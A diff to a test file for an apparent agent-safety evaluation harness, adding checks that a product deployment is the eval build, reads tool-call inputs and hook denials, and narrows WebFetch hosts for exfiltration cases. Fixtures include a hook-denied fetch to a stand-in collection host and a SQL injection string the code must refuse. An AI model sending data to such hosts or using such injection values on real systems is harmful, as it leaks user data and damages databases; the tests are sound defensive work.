@@ -28,6 +28,7 @@ class FakeDoor implements MemoryDoor {
     this.rowsNow.push(...facts.map((f) => ({ id: f.id, scope: f.scope, ownerId: f.ownerId, text: f.text, status: 'active' as const, rev: 1 })))
   }
   async clear() { this.calls.push('clear'); this.rowsNow = [] }
+  async setWebfetchHosts(hosts: string[] | null) { this.calls.push(`webfetch ${hosts === null ? 'default' : hosts.join(',')}`) }
 }
 
 interface Sent { method: string; path: string; token: string | null; body: any }
@@ -35,7 +36,9 @@ interface Server {
   members: { id: string; email: string | null; status: string }[]
   /** Polls of the chat that answer before the message shows. */
   emptyPolls: number
-  steps: { kind: string; detail: string }[]
+  steps: { kind: string; detail: string; io?: { input: string; cut?: true; denied?: true } }[]
+  /** `/api/me` says `evalBrand: true` (the eval deployment's marker) unless this is false. */
+  evalBrand?: boolean
   costMinor: number
   answerParts: { type: string; text?: string }[]
   sent: Sent[]
@@ -66,7 +69,7 @@ const server = (over: Partial<Server> = {}): { s: Server; fetch: typeof fetch } 
     const method = init?.method ?? 'GET'
     s.sent.push({ method, path: url.pathname + url.search, token, body })
     if (method !== 'GET' && headers.Origin !== 'https://eval.example.test') return json({ error: { code: 'forbidden' } }, 403)
-    if (url.pathname === '/api/me') return json({ memberId: TOKEN_OF[token ?? ''] })
+    if (url.pathname === '/api/me') return json({ memberId: TOKEN_OF[token ?? ''], ...(s.evalBrand === false ? {} : { evalBrand: true }) })
     if (url.pathname === '/api/members') return json({ items: s.members, nextCursor: s.endlessMembers ? 'more' : null })
     if (url.pathname.startsWith('/api/turns/') && url.pathname.endsWith('/stop')) {
       const n = stops++
@@ -108,6 +111,15 @@ describe('the eval-brand check (server side, before the first chat)', () => {
     await expect(target.seed([], { caseId: 'N01', rep: 1, canary: 'c' })).rejects.toThrow(ProductTargetRefusal)
     expect(door.calls).toEqual([])
     expect(srv.s.sent.filter((x) => x.method !== 'GET')).toEqual([])
+  })
+
+  it('refuses a deployment whose /api/me lacks evalBrand (the server\'s own marker, the first line): no door call, nothing sent', async () => {
+    const srv = server({ evalBrand: false })
+    const door = new FakeDoor()
+    await expect(make(srv, door).seed([], { caseId: 'N01', rep: 1, canary: 'c' })).rejects.toThrow(/evalBrand/)
+    expect(door.calls).toEqual([])
+    expect(srv.s.sent.filter((x) => x.method !== 'GET')).toEqual([])
+    expect(srv.s.sent.some((x) => x.path.startsWith('/api/members'))).toBe(false)
   })
 
   it('a brand with more members than the check reads is refused, not passed', async () => {
@@ -166,6 +178,34 @@ describe('a chat through the product', () => {
     expect(door.rowsNow.find((r) => r.text.startsWith('Tom wants'))!.ownerId).toBe('m_leo')
     await session.reset()
     expect(door.rowsNow).toEqual([])
+  })
+
+  it('reads each call\'s input, a cut and a hook denial from the owner\'s trace (eval build)', async () => {
+    const srv = server({ steps: [
+      { kind: 'tool', detail: 'WebFetch', io: { input: '{"url":"https://collect.evil-example.test/x"}', denied: true } },
+      { kind: 'tool', detail: 'mcp__inhouse__history_search', io: { input: '{"query":"Nor', cut: true } },
+      { kind: 'tool', detail: 'mcp__inhouse__memory_search', io: { input: '{"query":"Norda lead time"}' } },
+      { kind: 'tool', detail: 'Read' },
+    ] })
+    const res = await (await make(srv, new FakeDoor()).seed([], { caseId: 'R01', rep: 1, canary: 'c' })).chat('q')
+    expect(res.toolCalls).toEqual([
+      { name: 'WebFetch', input: { url: 'https://collect.evil-example.test/x' }, hookDenied: true },
+      { name: 'mcp__inhouse__history_search', input: {}, inputCut: true },
+      { name: 'mcp__inhouse__memory_search', input: { query: 'Norda lead time' } },
+      { name: 'Read', input: {} },
+    ])
+  })
+
+  it('an exfiltration case narrows the brand\'s WebFetch list to its hosts, and reset puts the default back', async () => {
+    const door = new FakeDoor()
+    const x01 = kase('X01')
+    const session = await make(server(), door).seed([], { caseId: 'X01', rep: 1, canary: 'c' }, x01.exfil)
+    expect(door.calls).toContain(`webfetch ${x01.exfil!.hosts.join(',')}`)
+    await session.reset()
+    expect(door.calls.at(-1)).toBe('webfetch default')
+    const plain = new FakeDoor()
+    await (await make(server(), plain).seed([], { caseId: 'N01', rep: 1, canary: 'c' })).reset()
+    expect(plain.calls.filter((c) => c.startsWith('webfetch'))).toEqual([])
   })
 
   it('an error part, or no text, is a failed run', async () => {
@@ -283,10 +323,10 @@ describe('cost of a chat that timed out or threw comes from the server', () => {
 })
 
 describe('the product README says what its numbers are', () => {
-  it('names the half-cent upper bound and the empty WebSearch input', () => {
+  it('names the half-cent upper bound, the kept inputs and the hook\'s denial', () => {
     const text = renderReadme(buildReport(CASES, [], { target: 'product', model: 'm', effort: 'e', reps: 1, notRun: [] }), 't')
     expect(text).toMatch(/upper bound \(\+0\.5 cent\)/)
-    expect(text).toMatch(/WebSearch call has input `\{\}`.*websearch\.unrequested.*never `websearch\.canary`/)
+    expect(text).toMatch(/Tool inputs come from route 33's kept input on the eval build.*cut.*websearch\.unrequested.*never `websearch\.canary`.*no tool result.*hook's denial/)
     expect(renderReadme(buildReport(CASES, [], { target: 'fake', model: 'm', effort: 'e', reps: 1, notRun: [] }), 't')).not.toMatch(/Product target notes/)
   })
 })
@@ -294,14 +334,12 @@ describe('the product README says what its numbers are', () => {
 describe('what the product cannot grade', () => {
   it('lists exactly these cases as unobservable (literal)', () => {
     expect(CASES.filter((c) => unobservableReason(c)).map((c) => c.id)).toEqual([
-      'R01', 'R02', 'R05', 'E03', 'T04', 'T06', 'T07', 'T09', 'T11', 'T12', 'T13', 'T14', 'T15', 'T16', 'C01', 'C02', 'C03', 'C05', 'X01', 'X02', 'X03', 'X05', 'X07',
+      'E03', 'X02', 'X05', 'X07',
     ])
   })
-  it('names the field each needs', () => {
-    expect(unobservableReason(kase('R01'))).toBe('memory_search input query (route 33 shows the tool name only)')
-    expect(unobservableReason(kase('T09'))).toBe('notification_send input to (route 33 shows the tool name only)')
-    expect(unobservableReason(kase('X01'))).toBe('WebFetch url and result (route 33 shows the tool name only)')
+  it('names the field each needs; tool inputs and WebFetch urls are observable on the eval build (option a-i)', () => {
     expect(unobservableReason(kase('X05'))).toBe('planting through history_search needs a priming chat')
+    for (const id of ['R01', 'R02', 'R05', 'T04', 'T06', 'T07', 'T09', 'T11', 'T14', 'T15', 'T16', 'X01', 'X03']) expect(unobservableReason(kase(id)), id).toBeNull()
   })
   it('E03 (a save for Lena) is unobservable: the product saves only for the caller', () => {
     expect(unobservableReason(kase('E03'))).toBe('memory_save person_id (the product saves only for the person asking; it has no person_id)')
@@ -311,8 +349,8 @@ describe('what the product cannot grade', () => {
   })
   it('the runner lists them as not graded and runs none of them', async () => {
     const srv = server()
-    const out = await runEvals({ target: make(srv, new FakeDoor()), cases: ['R01', 'R03', 'T09'].map(kase), reps: 1, concurrency: 1 })
-    expect(out.notGraded.map((n) => n.id)).toEqual(['R01', 'T09'])
+    const out = await runEvals({ target: make(srv, new FakeDoor()), cases: ['E03', 'R03', 'X05'].map(kase), reps: 1, concurrency: 1 })
+    expect(out.notGraded.map((n) => n.id)).toEqual(['E03', 'X05'])
     expect(out.rows.map((r) => r.caseId)).toEqual(['R03'])
   })
 })
@@ -360,6 +398,16 @@ describe('the memory door', () => {
     let spawned = 0
     expect(() => wranglerRunner({ database: 'inhouse-sbx-pr12-db', config, readConfig: () => text, env: ok, spawn: () => { spawned++; return { status: 0, stdout: '[]' } } })).toThrow(DoorRefusal)
     expect(spawned).toBe(0)
+  })
+  it('setWebfetchHosts upserts the brand\'s t:webfetch (its JSON string, hosts by line), deletes it for the default, and refuses a bad host', async () => {
+    const sqls: string[] = []
+    const door = createDoor(async (sql) => { sqls.push(sql); return [] })
+    await door.setWebfetchHosts(['docs.example.com', 'cdn.example.com:8443'])
+    expect(sqls[0]).toMatch(/^INSERT INTO settings \(owner, key, value_json, rev, updated_at_ms, updated_by, req_id\) VALUES \('brand', 't:webfetch', '"docs\.example\.com\\ncdn\.example\.com:8443"', 1, \d+, 'eval', 'eval'\) ON CONFLICT \(owner, key\) DO UPDATE SET value_json = excluded\.value_json, rev = settings\.rev \+ 1, updated_at_ms = excluded\.updated_at_ms, updated_by = 'eval', req_id = 'eval'$/)
+    await door.setWebfetchHosts(null)
+    expect(sqls[1]).toBe("DELETE FROM settings WHERE owner = 'brand' AND key = 't:webfetch'")
+    for (const bad of ["x'; DROP TABLE settings;--", 'a b', '', 'Docs.Example.com']) await expect(door.setWebfetchHosts([bad]), bad).rejects.toThrow(DoorRefusal)
+    expect(sqls).toHaveLength(2)
   })
   it('hasChat asks for exactly that chat id and refuses an id that is not one', async () => {
     const sqls: string[] = []
